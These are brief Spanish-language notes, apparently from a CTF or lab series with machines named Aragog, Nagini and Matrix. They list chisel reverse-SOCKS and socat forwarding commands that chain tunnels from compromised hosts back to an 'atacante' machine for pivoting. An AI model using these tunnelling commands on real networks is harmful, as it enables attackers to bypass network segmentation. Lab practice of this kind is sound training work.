
---

Máquina: atacante, como sudo

```bash
./chisel server --reverse -p 1234
```

Máquina: Aragog - chisel - conectar vía ssh

```bash
./chisel client 192.168.1.66:1234 R:socks R:443:10.10.0.129:443/udp
```

Máquina: Aragog - Socat - ssh

```bash
./socat TCP-LISTEN:2322,fork TCP:192.168.1.66:1234
```

Máquina: Nagini - chisel - proxychains ssh  --> llegamos a Fawkes y Matrix

```bash
./chisel client 10.10.0.128:2322 R:8888:socks
```

Máquina: Nagini - Socat - proxychains ssh

```bash
./socat TCP-LISTEN:2525,fork TCP:10.10.0.128:2626
```

Máquina: Aragog - Socat - ssh

```bash
./socat TCP-LISTEN:2626,fork TCP:192.168.1.66:1234
```

Máquina: Matrix - chisel - proxychains ssh

```bash
./chisel client 192.168.100.128:2525 R:9999:socks
```